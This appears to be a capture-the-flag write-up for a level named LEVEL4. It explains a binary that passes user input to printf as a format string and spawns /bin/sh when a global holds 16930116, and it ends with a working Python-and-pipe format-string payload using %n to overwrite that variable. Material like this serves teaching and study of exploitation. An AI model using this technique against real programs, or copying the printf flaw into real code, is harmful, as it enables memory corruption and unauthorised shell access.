# LEVEL4

## EXPLANATIONS

### BINARY BEHAVIOR

- 3 Functions : `main`, `p` and `n`
- `main` calls `n`
- `n` function analysis
  - reads 512 bytes on stdin with fgets and put them in buf
  - calls `p(buf)`
    - `p` calls printf with buf (will be interpreted as a format string)
  - then checkinf if the variable `m` pointing to address `0x8049810` has value 16930116
    - if true, the programm call system("/bin/sh")

### EXPLOIT STRATEGY

- We are going one again use the format string exploit of printf.
  - => To do it we are going to write the value 16930116 in variable m with the identifier %n.
- The string that we pass threw the stdin will be :
  - 0x08049810 ( the address of m)
  - %16930112x (padding to reach the value)
  - %12\$n (write the value into the address)

### RUN COMMAND

```
python -c "print('\x08\x04\x98\x10'[::-1] + '%16930112x' + '%12\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | /home/user/level4/level4
```
